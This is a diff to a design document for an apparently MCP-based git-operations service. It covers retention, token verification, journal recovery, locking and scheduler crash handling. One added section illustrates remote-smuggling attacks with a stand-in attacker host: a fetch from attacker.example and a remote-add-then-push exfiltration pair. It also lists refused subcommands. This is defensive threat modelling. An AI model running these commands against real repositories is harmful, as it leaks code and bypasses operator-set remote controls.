@@ -42,6 +42,10 @@ growth that is not theirs.
 | Operation journal | `settled` entries deleted after **30 days**; `attention` entries are never deleted, because they are the ones an operator still has to resolve. |
 | Notification outbox | Delivered rows deleted after **14 days**; failed rows retained until the operator clears them from the health view. |
 | Pre-migration store backups | The most recent **3** retained, older ones removed after a successful boot on the new schema — the rollback target item 18 needs is the latest one, not all of them. |
+| Expired and revoked `Token`s | Deleted **7 days** after expiry or revocation. This is the fastest-growing table in the store and the easiest to miss: a hundred clients refreshing hourly issue on the order of 900,000 rows a year if every issuance persists one. |
+| Revoked `Grant`s and `OAuthClient`s | Retained **180 days** after revocation, then deleted. Long enough to answer "what did that client have", short enough not to accumulate for the service's whole life. |
+| Terminal `ScheduledJob`s | `done`, `skipped` and `cancelled` deleted after **30 days**; `needs-attention` never. |
+| Orphaned `Declaration`s | Retained until the operator removes them. They are few, operator-authored, and the record of what a clone on disk belonged to. |
 
 All four windows are configuration with these as defaults, sized against a volume provisioned
 generously for the estate: of the order of 100 GB for roughly a dozen declarations, which is
@@ -55,8 +59,17 @@ information about the estate outgrowing its disk, not a routine event to log qui
 interlock still earns its place at these thresholds; it simply should rarely trip, and the day it
 does is a day worth hearing about.
 
+Audit retention and the hash chain have to be reconciled, because "verify end to end" and
+"delete the oldest segment" cannot both be unqualified. When a segment ages out, its terminal
+hash is written to the structured store as a **retained anchor** before the file is removed, and
+verification runs from the oldest surviving anchor forward. Without that, a legitimate retention
+delete is indistinguishable from truncation — either boot reports corruption every time retention
+runs, or prefix truncation stops being detectable at all.
+
 Retention runs on the same maintenance pass as eviction, and the disk-full path reports which of
-the five — clones, audit, journal, outbox, backups — is actually consuming the volume.
+the **six** consumers is actually taking the space — clones, audit, journal, outbox, backups, and
+the live structured store itself. The store was missing from that list, which is precisely the
+case where eviction frees nothing and the refusal would otherwise blame innocent declarations.
 
 **Volume loss is an accepted risk, not a covered one.** The pre-migration store copy is a rollback
 target for a bad image; it is on the same volume and protects nothing against losing it. No
@@ -85,6 +98,7 @@ Operator-owned authority. Persisted. Identity is `id`, chosen by the operator, i
 | Field | Type | Notes |
 |---|---|---|
 | `id` | string, `^[a-z0-9][a-z0-9-]{0,62}$` | Identity. Appears in the MCP resource URI and every API path, so it is URL-safe by validation rather than by escaping. Renaming is delete-then-create. |
+| `generation` | integer, from 1 | Incremented each time this `id` is re-declared after being orphaned. **The id alone is not an identity** — `(id, generation)` is. Stamped onto every journal entry, clone record, grant and audit line, so records from a previous era can never be mistaken for this one's. |
 | `cloneUrl` | string | Operator intent. Its host must be on the deployment's remote-host allowlist. |
 | `host` | `github` \| `generic` | Determines which host capabilities the grant may contain. `generic` gets local git only. |
 | `credentialRef` | string | A *name*, never a value: `^[a-z0-9][a-z0-9._-]{0,63}$`, matching a file name in the secrets mount. Resolved at point of use. Carries its own allowed-host constraint. |
@@ -113,10 +127,17 @@ on in four different ways.
 | `Grant`s and `Token`s whose resource is `/mcp/{id}` | Revoked, and the declaration's `grantEpoch` bumped, so live sessions bound to it close on their next call rather than continuing against a repository the operator has retired. |
 | Unsettled journal entries | Retained and reported. They are the record of work that may still be in the clone. |
 
-**Re-declaring the same `id` does not inherit any of it.** A new declaration gets a fresh
-`grantEpoch` and no authorization records, and unsettled journal entries from the previous era
-are not recovery candidates for it — recovery would otherwise classify an interruption belonging
-to a declaration this one only shares a name with.
+**Re-declaring the same `id` does not inherit any of it, and `generation` is what makes that
+enforceable rather than asserted.** The new declaration takes the next generation, starts with a
+fresh `grantEpoch` and no authorization records, and recovery selects journal entries by
+`(declarationId, generation)` — so an unsettled entry from the previous era is not a candidate,
+because it does not match, rather than because something remembered to exclude it. The same key
+governs which clone metadata, grants and audit lines belong to which era.
+
+The clone directory is the one thing that is *deliberately* shared across generations: it is
+left on disk by orphaning and adopted by the new declaration when the remote matches, which is
+why re-declaring an `id` whose orphaned clone points elsewhere is refused. Its metadata record
+carries the current generation; the tree it describes may predate it.
 
 #### `RepositoryConfig` — repository-supplied facts
 
@@ -269,7 +290,19 @@ the structured store.
 |---|---|---|
 | `OAuthClient` | `clientId` | Dynamically registered. Redirect URIs, registration time, `revokedAt`. |
 | `Grant` | `grantId` | `clientId`, subject, `resource` (the `/mcp/{declarationId}` URI), granted scopes, `createdAt`, `lastUsedAt`, `revokedAt`. Durable, so a client reconnects after a restart without re-authorising. |
-| `Token` | `jti` | `grantId`, `kind` (`access` \| `refresh`), `expiresAt`, `revokedAt`. Access tokens are short-lived; refresh tokens are durable, which is the half of item 12 that survives a restart. |
+| `Token` | `jti` | `grantId`, `kind` (`access` \| `refresh`), `expiresAt`, `revokedAt`, and **`verifierHash`** — a salted hash of the token value. Access tokens are short-lived; refresh tokens are durable, which is the half of item 12 that survives a restart. |
+
+**Tokens are opaque and verified by stored hash, not signed.** A record holding only `jti` and
+expiry cannot authenticate anything: after a restart the client presents a bearer string, and
+without a verifier there is nothing to check it against, so item 12's reconnection would fail or
+the service would have to accept a token it cannot validate. The value is high-entropy random,
+issued once, stored only as a salted hash, and compared in constant time.
+
+Signed tokens were the alternative and are rejected here: a JWT buys stateless verification this
+design never needs — one issuer, one resource server, one process — and it costs a signing-key
+lifecycle, rotation, and a revocation story that has to reach tokens already in the wild. With
+opaque tokens, revocation is the store lookup that already happens on every call, so the
+revocation model above stays exactly one mechanism rather than two.
 
 Three rules govern them:
 
@@ -307,17 +340,31 @@ interruption whose intent was never recorded.
 | Field | Type | Notes |
 |---|---|---|
 | `operationId` | string | identity |
-| `declarationId` | string | |
+| `declarationId`, `generation` | string, integer | Both. Recovery selects on the pair, so an entry from a previous era of the same id never matches. |
 | `tool` | string | registry name |
 | `input` | JSON | scrubbed |
 | `actorRef` | `{ kind, subject, clientId? }` | |
-| `preState` | `{ branch, headSha, indexClean, treeClean, upstreamSha }` | captured under the lock, before acting |
+| `preState` | `{ branch, headSha, upstreamSha, indexTreeHash, worktreeDigest }` | Captured under the lock, before acting. **Digests, not booleans.** `indexTreeHash` is the tree object the index would write; `worktreeDigest` covers tracked paths that differ from it, plus the untracked set. |
 | `steps` | array of `{ name, state, at }` | composites journal each sub-step |
 | `state` | `intended` \| `applied` \| `settled` \| `attention` | |
 | `startedAt`, `updatedAt` | ISO 8601 UTC | |
 
 `settled` means the outcome has been observed and reported. Any entry not `settled` at boot is
 a recovery candidate.
+
+**Why digests rather than clean/dirty flags.** Booleans cannot represent the case recovery most
+needs to classify. An operation that begins against an already-dirty tree, changes one path, and
+crashes leaves `indexClean` and `treeClean` exactly as they were — so a comparison against them
+concludes that nothing happened and marks the entry `settled`, silently converting a real side
+effect into a non-event. That is the opposite of what definition-of-done item 14 asks for, and it
+fails most often on a long-lived clone, which is usually dirty. Digests change whenever the
+content changes, so "pre-state matches" means what it says. The cost is a tree hash before every
+mutation, which git computes cheaply and which the operation is about to do anyway.
+
+This does not make every outcome representable. `git.raw` can do things no post-state predicate
+anticipates, and a host-side mutation leaves no local trace at all — both land in the
+"neither matches" branch and park as `attention`, which is the honest outcome rather than a
+guessed one.
 
 #### `ScheduledJob` — generalised hold-and-act
 
@@ -333,6 +380,7 @@ The publish-shaped scheduler becomes an operation-shaped one — a redesign rath
 | `onMissed` | `{ mode: 'catch_up' }` \| `{ mode: 'skip_if_older_than', seconds }` | explicit per job, never an implicit default — inherited whole |
 | `frozenGrant` | set of capability names | the creator's effective set, captured at creation |
 | `status` | `pending` \| `running` \| `done` \| `skipped` \| `cancelled` \| `needs-attention` | |
+| `operationId` | string? | **Written when the job transitions to `running`, before dispatch.** Without it a job caught mid-flight by a restart has no link to the journal entry that records what it actually did. |
 | `reason` | string? | set on `skipped` or `needs-attention` |
 | `createdBy` | `actorRef` | |
 
@@ -437,7 +485,7 @@ L0  Contract        contract types  |  compiler  |  generated registry
 | **Declarations** (L1) | The declaration table, the lattice intersection, the remote-host allowlist. | Structured store, result. | Read, write, and the effective-grant computation. |
 | **Credentials** (L1) | Reference-to-secret resolution and the allowed-host constraint on each reference. Ships one resolver — the mounted secrets directory — behind an interface a second could satisfy. | The configured resolver. | Resolution that returns a value only into an exec environment, never to a handler. |
 | **Clone store** (L1) | Materialisation, the safe-to-evict predicate, eviction, disk-pressure watermarks, remote cross-check, and the maintenance pass that applies eviction and retention outside any mutation-locked region. | Exec, declarations, locks, journal, audit. | Ensure, evict-if-safe, describe, request-maintenance. |
-| **Journal** (L1) | Intent records and the boot recovery classification. | Structured store, clock. | Begin, step, settle, recover. |
+| **Journal** (L1) | Intent records, and the *classification rule* applied to a state observation it is handed. **It does not read git.** | Structured store, clock. | Begin, step, settle, and a pure `classify(entry, observedState)`. |
 | **Audit** (L1) | The append-only scrubbed log. | Exec's scrubber, clock. | Append. Never throws. |
 | **Git operations** (L2) | Every repository-generic git behaviour: status, log, branches, health, diff, stage, commit, restore-paths, push, and the seven protected-base invariants. | L1. | Domain functions returning `ToolResult`. |
 | **Composites** (L2) | Handwritten, fixed-sequence transactional operations — branch preparation, reconcile-after-merge. Each declares its journal steps and its resume behaviour. | Git operations, host adapter, journal. | Domain functions. |
@@ -461,6 +509,13 @@ Two edges would obviously become cycles, and are cut deliberately:
 - **The scheduler needs to dispatch**, and dispatch lives at L4 above it. It does not import the
   pipeline; the pipeline is injected at composition time. The scheduler is a caller like any
   other and gets no privileged path.
+- **Recovery needs to compare a journal entry against real git state**, and the two live in
+  modules that cannot both depend on each other — clone store already depends on journal. The cut
+  is that **journal owns the rule, clone store owns the observation**: clone store re-derives
+  branch, `HEAD`, upstream and the two digests, hands that record to the journal's pure
+  `classify`, and acts on the verdict. Neither the git-state interpretation nor the
+  classification rule is duplicated, and no edge reverses. Without this split the obvious
+  implementation gives journal a dependency on clone store and closes a cycle.
 
 One further boundary is a product decision rather than hygiene: **nothing in L0, L3 or L4 may
 import anything from L2.** The runtime is generic; the git domain is a consumer of it. That is
@@ -524,7 +579,10 @@ assumption that some views belong to one repository.
    It then re-checks capabilities (a stale catalogue or a by-name call must not reach a handler),
    validates input against the schema, and applies the declared timeout and result-size limits.
 6. The clone store ensures materialisation, taking the **materialisation** lock for this
-   declaration and **holding it for the rest of the operation**. If the clone is absent it clones
+   declaration. **A mutating call holds it for the rest of the operation; a read or a monitoring
+   wait releases it as soon as the clone is `ready`** and relies on the active-operation count
+   alone, because a 1800 s wait holding a declaration's materialisation lock would block every
+   mutation on that repository for half an hour. If the clone is absent it clones
    — outside the global mutation lock, so every other repository keeps serving, which is what
    definition-of-done item 5 requires. The observed remote is cross-checked against
    `Declaration.cloneUrl`; a mismatch refuses rather than repointing an existing checkout. The
@@ -542,7 +600,12 @@ assumption that some views belong to one repository.
     maintenance pass; eviction never runs on this path, because it would acquire a materialisation
     lock after a mutation lock.
 11. On a terminal state an unwatched caller cannot see — merge conflict, failed required check,
-    wait timeout — the notifier fires.
+    wait timeout — the notifier fires. **The outbox row is written in the same store transaction
+    that marks the entry `settled`**, and delivery happens afterwards, asynchronously. Settling
+    first and enqueuing second would leave a crash window in which the operation is recorded as
+    complete, recovery therefore ignores it, and no outbox row exists to retry — so the one
+    terminal state that most needed to reach you is the one that never does. Boot re-drives every
+    undelivered row for the same reason.
 
 **The scheduler tick is this path with a different actor.** It selects due jobs, re-intersects
 the frozen grant, and calls the same pipeline. It has no privileged route and no second
@@ -594,21 +657,28 @@ implementation of any operation.
 3. Verify the deployment ceiling names only capabilities in the contract set. Verify every
    registry operation has exactly one executor.
 4. Open the structured store; back it up, then run forward-only migrations.
-5. **Re-validate every pending scheduled job against the registry just loaded.** An image upgrade
+5. **Resolve every job left `running` by the previous process, before anything else touches the
+   scheduler.** A job that reached `running` wrote its `operationId` first, so its outcome is
+   whatever the journal says: an entry that recovery settles makes the job `done`, one that parks
+   as `attention` makes the job `needs-attention` with the same reason, and a job whose journal
+   entry does not exist never dispatched and returns to `pending`. **A `running` job is never
+   simply fired again** — its side effect may have been a push, a pull request or a merge, and
+   re-running blind is how a scheduled operation becomes a duplicate one.
+6. **Re-validate every pending scheduled job against the registry just loaded.** An image upgrade
    can rename a tool, remove one, or change its input schema while jobs referencing the old shape
    sit pending; without this sweep the failure surfaces weeks later at fire time, with its cause
    an upgrade nobody is still thinking about. A job whose tool no longer exists, or whose stored
    input no longer validates, becomes `needs-attention` with the reason naming the upgrade, and
    the operator sees it next to the fingerprint checks that caused it rather than at 03:00.
-6. Re-derive every clone's state from disk. The stored value is a report, not a source of truth.
-7. **Readiness passes and transports start**, before any recovery work runs. Recovery is
+7. Re-derive every clone's state from disk. The stored value is a report, not a source of truth.
+8. **Readiness passes and transports start**, before any recovery work runs. Recovery is
    per-declaration and lazy: a declaration with unsettled journal entries is marked
    `recovery-pending` and recovers on first use or on a background sweep, whichever comes first,
    and refuses mutations until it has. Eager recovery across every declaration would make restart
    cost scale with estate size — minutes of total unavailability at a few hundred clones, to
    recover state concerning at most one of them — which would make operators avoid the restart
    that definition-of-done item 14 exists to make safe.
-8. **The recovery pass itself, per declaration, before that declaration serves a mutation.** For
+9. **The recovery pass itself, per declaration, before that declaration serves a mutation.** For
    each journal entry not `settled`, re-derive actual state and compare against `preState` and
    the operation's expected post-state:
    - pre-state matches and no step is `applied` — nothing happened; mark `settled`;
@@ -685,10 +755,10 @@ its lifecycle is part of the security design rather than a framework default.
 | Dependency | What fails | Detected by | System does | Caller sees | State left behind |
 |---|---|---|---|---|---|
 | **Remote git host** | Unreachable, DNS, TLS | Non-zero exit from a bounded `git` invocation (clone capped at 300 s) | No retry inside the call | `upstream` | Initial clone: partial directory removed, clone `absent`. Fetch: refs unchanged, since git updates refs atomically. |
-| | Auth rejected | Exit code plus scrubbed stderr | Marks the credential reference failing; never retries with a different one. The mark is per reference, so every declaration sharing it fails fast rather than each discovering it in turn. It clears when the resolver observes a changed secret, and the operator can clear it by hand from the health view — a rotated token must not need a restart to be noticed, or the no-restart onboarding property dies quietly | `upstream`, naming the reference, never the secret | Unchanged |
+| | Auth rejected | Exit code plus scrubbed stderr | Marks the reference failing **for that declaration only** — keyed `(credentialRef, declarationId)`, never the reference alone. A token can be valid for repository A and unauthorised for B, and a reference-wide mark would take A out of service because of B's permissions, turning one repository's misconfiguration into an unrelated outage. Never retries with a different credential. The mark clears when the resolver observes a changed secret, or by hand from the health view, so a rotated token needs no restart | `upstream`, naming the reference and the declaration, never the secret | Unchanged |
 | | Clone timeout | The 300 s cap | Removes the partial directory under the materialisation lock | `timeout` | `absent` |
 | | Base diverged from local | Ancestry check in branch preparation | Reports; changes nothing | `precondition` naming both SHAs | Unchanged; every commit still reachable |
-| **GitHub via `gh`** | Rate limit | Response headers and exit code | Trips the per-credential budget; monitoring waits back off with jitter | `precondition` with a retry-after — a rate limit is repository-state-shaped, not a service fault | Unchanged |
+| **GitHub via `gh`** | Rate limit | Response headers and exit code | Trips the per-credential budget; monitoring waits back off with jitter | `upstream` with a retry-after. A rate limit is a declared external service declining to serve, which the generating rule classifies as `isError: true`; calling it `precondition` said the repository was in a state that prevented the operation, which is false and lets a caller treat an unavailable dependency as a normal gate | Unchanged |
 | | 5xx or transport error | Exit code | Up to three retries with backoff, **read operations only** | `upstream` after exhaustion | Unchanged |
 | | Merge conflict | PR state | **Terminal.** No rebase tool exists and by design never will | `precondition` naming the branch and both heads | Branch and commits intact; notifier fires |
 | | Required check failed | Check status | Terminal for the operation | `precondition` | PR open, nothing merged; notifier fires |
@@ -740,6 +810,26 @@ handler rather than the generic shell adapter the non-goals forbid. It is not su
 own: `git` can be turned into a command executor through configuration and helper options, so
 the handler additionally runs with system and global configuration disabled and a neutral home
 directory, and rejects argument forms that select an executable or inject configuration.
+
+**Remote operands are constrained separately, because the non-goal is binding.** The brief
+states that a caller can never hand the service a repository URL at call time — both credentials
+and remotes come only from operator configuration — and nothing in the rules above touches an
+operand. `git fetch https://attacker.example/repo.git` is an ordinary argument vector. Two rules
+close it, and both are needed:
+
+- **Any operand that parses as a URL or an scp-style remote must resolve to a host on the
+  deployment's remote-host allowlist**, or the call is rejected as `validation` before the
+  process starts.
+- **Subcommands that persist a remote are refused outright** — `remote add`, `remote set-url`,
+  `submodule add`, and any `config` write matching `remote.*`. Checking operands alone is
+  defeated by two calls that are individually legal: `git remote add sink <url>` followed by
+  `git push sink`, where the second argument vector contains no URL at all. The repository-local
+  config is the one configuration surface the neutral-home rule does not cover, so it is closed
+  here by subcommand rather than by environment.
+
+This is enumeration, and enumeration is weaker than construction. It holds for the hatch's
+argument vector; it does not hold against code the hatch reaches by other means, which is the
+residual risk below.
 
 **This narrows the risk; it does not eliminate it.** A sufficiently determined caller with
 `git.raw` can still reach command execution inside the container through git's own extension
@@ -794,7 +884,7 @@ Two locks, one counter, and a fixed acquisition order.
 | Mechanism | Scope | Covers | Held for |
 |---|---|---|---|
 | **Global mutation mutex** | Process-wide, across every declaration | Working-tree, index, `HEAD` and ref mutations; fetch; pull-request and merge mutations | The whole operation, including its network transfer — see the throughput ceiling below |
-| **Per-declaration materialisation mutex** | One declaration | Initial clone, eviction | The whole operation for a caller; up to the 300 s clone cap for a clone |
+| **Per-declaration materialisation mutex** | One declaration | Initial clone, eviction | The whole operation for a **mutating** caller; released at `ready` for reads and waits; up to the 300 s clone cap for a clone |
 | **Per-declaration active-operation count** | One declaration | Reads, monitoring waits, and every operation in flight | Not a lock. A non-blocking counter that never makes a caller wait; eviction refuses while it is non-zero |
 
 ### The lock protocol
@@ -803,11 +893,15 @@ The deadlock argument depends on all four rules, not on the order alone. Stated 
 because three of them are the ones an implementer would otherwise have to invent.
 
 1. **Acquisition order is always materialisation before mutation, never the reverse.**
-2. **A caller holds the materialisation lock for the whole operation**, not just for the ensure
-   step, and releases in reverse acquisition order. Releasing it early would let eviction remove
-   the clone between the ensure and the journal write, producing an intent record for a working
-   tree that no longer exists — a state recovery cannot classify, because its pre-state is no
-   longer re-derivable.
+2. **A mutating caller holds the materialisation lock for the whole operation**, not just for the
+   ensure step, and releases in reverse acquisition order. Releasing it early would let eviction
+   remove the clone between the ensure and the journal write, producing an intent record for a
+   working tree that no longer exists — a state recovery cannot classify, because its pre-state is
+   no longer re-derivable. **Reads and monitoring waits release it once the clone is `ready`** and
+   are protected from eviction by rule 4 instead; holding it across a bounded wait of up to
+   1800 s would serialise every mutation on that repository behind a caller that is only watching.
+   This is the one place the two mechanisms divide: the lock orders materialisation against
+   mutation, the counter keeps a clone alive while anyone is reading it.
 3. **Eviction never runs while the global mutation lock is held.** The disk-pressure watermark
    check after a mutation records the pressure and requests a maintenance pass; the pass runs
    with no mutation lock held and takes materialisation locks in its own right. Without this
@@ -854,6 +948,15 @@ Honest limits, stated rather than left to be discovered:
   `operationId` of the last settled mutation and a `mutationInFlight` flag, so a caller can tell
   whether what it read was stable. Reads are not made atomic, because taking the lock to read
   reintroduces exactly the blocking the read exemption exists to avoid.
+- **Lock-free does not mean unbounded, and needs its own admission control.** The mutation mutex
+  bounds mutations; nothing bounds reads and monitoring waits, and a 1800 s wait holds a socket,
+  a subprocess and memory for half an hour. Without a cap, enough concurrent waits exhaust the
+  process and starve the console without breaching any queue limit or rate budget — the service
+  stays nominally correct and stops answering. Two caps therefore apply: a per-session limit on
+  concurrent monitoring waits, and a process-wide limit on all in-flight lock-free work. Exceeding
+  either returns `conflict`, the same kind a full mutation queue returns, because from the
+  caller's side it is the same thing: come back later. The values belong with the other
+  operational numbers rather than in this document.
 - **Throughput is one mutation at a time across the whole estate, and the lock is held across
   network transfers.** Fetch and push take the global mutex and carry their own caps — 300 s
   each, alongside the 300 s clone cap — so the worst-case hold is a slow transfer, not the
